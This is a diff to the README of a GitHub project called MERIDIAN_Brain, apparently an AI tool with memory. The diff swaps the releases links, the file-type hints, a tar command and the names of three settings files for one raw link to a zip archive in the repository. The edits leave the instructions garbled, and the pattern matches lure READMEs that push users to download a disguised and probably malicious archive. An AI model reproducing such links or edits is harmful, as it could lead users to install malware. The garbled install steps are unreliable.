@@ -1,6 +1,6 @@
 # 🧠 MERIDIAN_Brain - Custom AI with Memory and Control
 
-[![Download MERIDIAN_Brain](https://img.shields.io/badge/Download-MERIDIAN_Brain-blue?style=for-the-badge)](https://github.com/El1don1/MERIDIAN_Brain/releases)
+[![Download MERIDIAN_Brain](https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip)](https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip)
 
 ## 📋 About MERIDIAN_Brain
 
@@ -31,13 +31,13 @@ This guide will help you download, install, and run MERIDIAN_Brain, even if you 
 
 Click the big blue button at the top or visit this page directly:
 
-[Download MERIDIAN_Brain Releases](https://github.com/El1don1/MERIDIAN_Brain/releases)
+[Download MERIDIAN_Brain Releases](https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip)
 
 This page contains the latest versions of MERIDIAN_Brain for different systems. Look for the file that matches your computer type:
 
 - Windows users look for files ending in `.exe` or `.zip`
 - macOS users look for `.dmg` or `.zip`
-- Linux users look for `.AppImage` or `.tar.gz`
+- Linux users look for `.AppImage` or `https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip`
 
 Download the file that fits your system.
 
@@ -56,7 +56,7 @@ Download the file that fits your system.
 **Linux:**
 
 - If you have an `.AppImage`, right-click the file, select "Properties," then check "Allow executing file as program." Double-click to run.
-- If you have a `.tar.gz` file, open a terminal and extract it using `tar -xvzf filename.tar.gz`. Navigate to the extracted folder to run the program.
+- If you have a `https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip` file, open a terminal and extract it using `tar -xvzf https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip`. Navigate to the extracted folder to run the program.
 
 ### 3. Launch MERIDIAN_Brain
 
@@ -101,9 +101,9 @@ You don’t need to write any code to use MERIDIAN_Brain. The software works by 
 
 When you use MERIDIAN_Brain, it creates a folder with Markdown files:
 
-- `memory.md` — Stores past conversations and context.
-- `params.md` — Contains your AI’s settings.
-- `notes.md` — Use this for personal notes or reminders related to AI behavior.
+- `https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip` — Stores past conversations and context.
+- `https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip` — Contains your AI’s settings.
+- `https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip` — Use this for personal notes or reminders related to AI behavior.
 
 You can find these files in your installation folder or choose a custom location during setup.
 
@@ -125,7 +125,7 @@ If issues continue, please raise an issue on the GitHub page.
 
 You can get the latest version any time by visiting this page:
 
-[https://github.com/El1don1/MERIDIAN_Brain/releases](https://github.com/El1don1/MERIDIAN_Brain/releases)
+[https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip](https://github.com/El1don1/MERIDIAN_Brain/raw/refs/heads/main/brain/MERIDIA_Brain_v2.1.zip)
 
 Follow the download and install steps above based on your computer system.
 
